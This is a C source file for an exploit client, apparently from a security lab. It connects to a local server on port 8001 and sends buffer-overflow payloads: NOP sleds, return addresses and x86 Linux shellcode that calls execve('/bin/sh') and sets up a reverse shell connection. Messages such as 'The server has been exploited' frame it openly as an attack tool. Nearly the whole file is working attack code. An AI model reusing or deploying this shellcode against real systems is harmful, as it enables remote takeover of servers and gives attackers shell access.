/* A client */

#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>
#include <netdb.h>
#include <time.h>

#define	PORTNUM	8001
#define	BLENGTH	104
#define	ALENGTH	32

static void
loop(int s)
{
  char buffer[BLENGTH];
  char name_for_exploit_alpha[ALENGTH] = \
       "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
  
  char name_for_exploit_beta[ALENGTH] = \
       "\x90\x90\x90\x89\xe5\x31\xc0\x31\xc9\x31\xd2\x50\x50\xb8\x02\x02\x02\x02\xbb\x7d\x02\x02\x03\x31\xc3\x53\x66\x68\x1f\x42\x66\x6a";
  
  int ctr = 0;
  char *buffer_filter = "Time";


   char *reverse_shell_exploit_beta = \
       "\x02\x31\xc0\x31\xdb\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc3\x66\xb8\x6a\x01\x89\xe1\x89\xea\x29\xe2\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x49\xcd\x80\x41\xe2\xf6\x31\xc0\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\xe0\x32\xdc\xb7\xe0\x32\xdc\xb7\xe0\x32\xdc\xb7\xe0\x32\xdc\xb7\xe0\x32\xdc\xb7\xe0\x32\xdc\xb7\x90\x90\x90\x90\x90\x90\x90\x90";


char *reverse_shell_exploit_alpha = \
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh\xe8\x32\xdc\xb7\xe8\x32\xdc\xb7\xe8\x32\xdc\xb7\xe8\x32\xdc\xb7\xe8\x32\xdc\xb7\xe8\x32\xdc\xb7";

int  choice = 50;
/* printf(" Choose the kind of exploit you are looking for: \n");
   printf("%s\n", "Enter 1 for simple reverse shell exploit.");
   printf("%s\n%s", "Enter 2 for reverse shell fully controllable by you.","Enter your choice: "); */
 
   if ((int)choice == 49){

     send(s, name_for_exploit_alpha, ALENGTH, 0);

   } else if ((int)choice == 50) {

     send(s, name_for_exploit_beta, ALENGTH, 0);

   } else {

     printf("Terminating the program. \n Please re run and enter a valid choice for the kind of exploit you want. Bye!\n");
     exit(0);

}

 
  int i;
  for (;;) {

    /* Receive prompt */
    if (recv(s, (void *)buffer, BLENGTH, 0) != BLENGTH) {
      /* break; */
    }

    /* Display prompt */
    fputs(buffer, stdout);
    
    /* Read user response */
    /* fgets(buffer, BLENGTH, stdin); */

if (strstr(buffer, buffer_filter) != NULL) {

    /* Read user response */
    fgets(buffer, BLENGTH, stdin);
    /* Send user response */
    send(s,  (void *)buffer, BLENGTH, 0);
  
} else {
 int ctr = 0; 
 if (ctr == 0) {

   if ((int)choice == 49) {

   printf(" Begining to exploit the server...\n");
   send(s,  (void *)reverse_shell_exploit_alpha, BLENGTH, 0);
   printf(" The server has been exploited...\n");
   ctr+=1;

   } else if ((int)choice == 50) {

   printf(" Begining to exploit the server...\n");  
   send(s,  (void *)reverse_shell_exploit_beta, BLENGTH, 0);
   printf(" The server has been exploited...\n");
   ctr+=1;

        }    
      }
    }
  }  
}

int
main(void)
{
  struct sockaddr_in server;
  struct hostent *host;
  int s;

  /* Create an Internet family, stream socket */
  s = socket(AF_INET, SOCK_STREAM, 0);
  if (s < 0) {
    perror("socket()");
    exit(EXIT_FAILURE);
  }

  /* Server listening on localhost interface */
  if ((host = gethostbyname("localhost")) == NULL) {
    perror("gethostbyname()");
    exit(EXIT_FAILURE);
  }

  /* Fill in socket address */
  memset((char *)&server, '\0', sizeof (server));
  server.sin_family = AF_INET;
  server.sin_port = htons(PORTNUM);
  memcpy((char *)&server.sin_addr, host->h_addr_list[0], host->h_length);

  /* Connect to server */
  if (connect(s, (struct sockaddr *)&server, sizeof (server)) < 0) {
    perror("connect()");
    exit(EXIT_FAILURE);
  }

  /* Talk to server */
  loop(s);

  /* Close the socket */
   close(s);

  return (0);
}
